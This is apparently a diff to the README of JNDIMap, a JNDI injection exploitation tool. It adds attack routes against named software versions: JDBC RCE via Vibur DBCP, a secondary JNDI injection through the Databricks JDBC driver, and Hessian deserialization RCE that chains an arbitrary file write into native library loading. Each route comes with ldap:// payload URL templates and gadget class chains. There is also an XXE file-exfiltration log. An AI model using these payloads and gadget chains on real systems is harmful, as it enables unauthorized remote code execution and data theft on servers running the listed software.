@@ -198,7 +198,7 @@ Use XStream deserialization to achieve RCE (version <= 1.4.15)
 The deserialization part uses UIDefaults + SwingLazyValue to trigger the following gadgets in sequence:
 
 - Arbitrary file write: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
-- XSLT Loading: `com.sun.org.apache.xalan.internal.xslt.Process._main`
+- XSLT loading: `com.sun.org.apache.xalan.internal.xslt.Process._main`
 
 The XSLT payload uses Spring's reflection library to call defineClass, so it requires a Spring environment
 
@@ -294,6 +294,7 @@ Support JDBC RCE for the following database connection pools
 - Tomcat JDBC
 - Alibaba Druid
 - HikariCP
+- Vibur DBCP
 
 Replace the `Factory` in the URL with one of the following:
 
@@ -304,6 +305,7 @@ Replace the `Factory` in the URL with one of the following:
 - TomcatJDBC
 - Druid
 - HikariCP
+- Vibur
 
 Because Alibaba Druid's DruidDataSourceFactory doesn't support the breakAfterAcquireFailure and connectionErrorRetryAttempts parameters, by default, if the JDBC connection fails, an infinite retry cycle will occur in the newly created thread. This can cause the console to continuously output error messages and lead to log explosion and other problems. Using this feature is not recommended unless necessary. Reference: [https://github.com/alibaba/druid/issues/3772](https://github.com/alibaba/druid/issues/3772)*
 
@@ -480,6 +482,15 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: show usage
 
+### Databricks
+
+Secondary JNDI injection via JAAS configuration in Databricks JDBC driver (version <= 2.6.38)
+
+```bash
+# JNDI injection
+ldap://127.0.0.1:1389/Factory/Databricks/JNDI/<url>
+```
+
 ## Tomcat Blind XXE
 
 Use `org.apache.catalina.users.MemoryUserDatabaseFactory` to achieve Blind XXE
@@ -501,6 +512,22 @@ Due to JDK limitations, XXE can only read single-line files that do not contain 
 [HTTP] Receive request: /TsBaggdL.dtd
 [HTTP] Receive request: /V4J4ZH1P?content=helloworld
 ```
+
+## Hessian RCE
+
+Exploiting Hessian deserialization RCE using `com.caucho.hessian.client.HessianProxyFactory`
+
+The deserialization part uses UIDefaults + ProxyLazyValue to trigger the following gadgets in sequence:
+
+- Arbitrary file write: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
+- Dynamic library loading: `java.lang.System.load`
+
+```bash
+# Hessian RCE
+ldap://127.0.0.1:1389/Hessian/<interface>/LoadLibrary/<path-to-native-library>
+```
+
+Note that this route requires specifying the `interface` to set the interface class for the dynamic proxy. The server must have logic that calls any method of this interface after the JNDI lookup; otherwise, the deserialization will not be triggered
 
 ## LDAP Deserialization
 
